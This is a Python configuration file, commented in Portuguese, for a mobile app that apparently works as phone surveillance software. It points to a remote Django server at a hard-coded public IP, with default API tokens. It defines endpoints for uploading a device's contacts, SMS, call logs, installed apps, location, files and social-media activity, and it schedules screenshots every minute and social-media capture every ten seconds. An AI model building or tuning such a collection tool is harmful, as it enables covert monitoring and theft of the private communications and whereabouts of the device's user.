"""
Configuração centralizada para o app mobile
"""
import os

# Determinar se está em modo desenvolvimento ou produção
# Pode ser controlado por variável de ambiente ou configuração
ENV_MODE = os.getenv('ENV_MODE', 'development')  # 'development' ou 'production'

# Configurações por ambiente
DJANGO_CONFIGS = {
    'production': {
        'IP': '147.79.111.118',  # IP da VPS Ubuntu
        'PORT': '8000',
        'API_TOKEN': os.getenv('API_TOKEN', 'your-secret-api-token-here'),
    },
    'development': {
        'IP': '192.168.0.97',  # IP correto da rede Wi-Fi local
        'PORT': '8000',
        'API_TOKEN': os.getenv('API_TOKEN', 'dev-token-123'),
    }
}

# Selecionar configuração baseada no ambiente
DJANGO_CONFIG = DJANGO_CONFIGS.get(ENV_MODE, DJANGO_CONFIGS['production'])

# Endpoints da API
ENDPOINTS = {
    'atividade': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/atividade/",
    'contatos': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/contatos/",
    'sms': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/sms/",
    'chamadas': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/chamadas/",
    'apps': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/apps/",
    'localizacao': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/localizacao/",
    'upload': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/upload/",
    'redes_sociais': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/redes-sociais/",
    'atividade_rede': f"http://{DJANGO_CONFIG['IP']}:{DJANGO_CONFIG['PORT']}/api/atividade-rede/",
}

# Headers padrão com autenticação
HEADERS = {
    'Authorization': f"Bearer {DJANGO_CONFIG['API_TOKEN']}",
    'Content-Type': 'application/json'
}

# Configurações de coleta
COLETA_CONFIG = {
    'intervalo_localizacao': 300,  # 5 minutos
    'intervalo_rede': 300,        # 5 minutos
    'intervalo_dispositivo': 600, # 10 minutos
    'intervalo_apps': 3600,       # 1 hora
    'intervalo_contatos': 7200,   # 2 horas
    'intervalo_sms': 3600,        # 1 hora
    'intervalo_chamadas': 3600,   # 1 hora
    'intervalo_screenshot': 60,   # 1 minuto
    'intervalo_social': 10,       # 10 segundos
}

# Configurações de limite
LIMITES = {
    'max_apps_por_envio': 20,
    'max_contatos_por_envio': 50,
    'max_sms_por_envio': 20,
    'max_chamadas_por_envio': 20,
}

# Configurações de logging
LOGGING_CONFIG = {
    'level': 'INFO',
    'format': '%(levelname)s: %(message)s'
}
